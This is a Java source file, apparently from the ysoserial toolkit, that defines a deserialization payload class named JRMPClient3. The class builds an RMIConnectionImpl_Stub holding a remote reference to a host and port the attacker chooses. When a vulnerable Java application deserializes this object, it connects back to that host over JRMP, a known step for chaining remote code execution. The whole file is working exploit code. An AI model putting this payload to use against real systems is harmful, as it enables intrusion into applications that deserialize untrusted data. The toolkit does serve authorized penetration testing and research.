package ysoserial.payloads;

import java.rmi.server.ObjID;
import java.util.Random;

import sun.rmi.server.UnicastRef;
import sun.rmi.transport.LiveRef;
import sun.rmi.transport.tcp.TCPEndpoint;
import ysoserial.payloads.util.PayloadRunner;
import javax.management.remote.rmi.RMIConnectionImpl_Stub;

public class JRMPClient3 extends PayloadRunner implements ObjectPayload<Object> {

    public Object getObject (final String command ) throws Exception {
        String host;
        int port;
        int sep = command.indexOf(':');
        if (sep < 0) {
            port = new Random().nextInt(65535);
            host = command;
        }
        else {
            host = command.substring(0, sep);
            port = Integer.valueOf(command.substring(sep + 1));
        }
        ObjID objID = new ObjID(new Random().nextInt());
        TCPEndpoint tcpEndpoint = new TCPEndpoint(host, port);
        UnicastRef ref = new UnicastRef(new LiveRef(objID, tcpEndpoint, false));
        RMIConnectionImpl_Stub stub = new RMIConnectionImpl_Stub(ref);
        return stub;
    }


    public static void main ( final String[] args ) throws Exception {
        Thread.currentThread().setContextClassLoader(JRMPClient3.class.getClassLoader());
        PayloadRunner.run(JRMPClient3.class, args);
    }
}
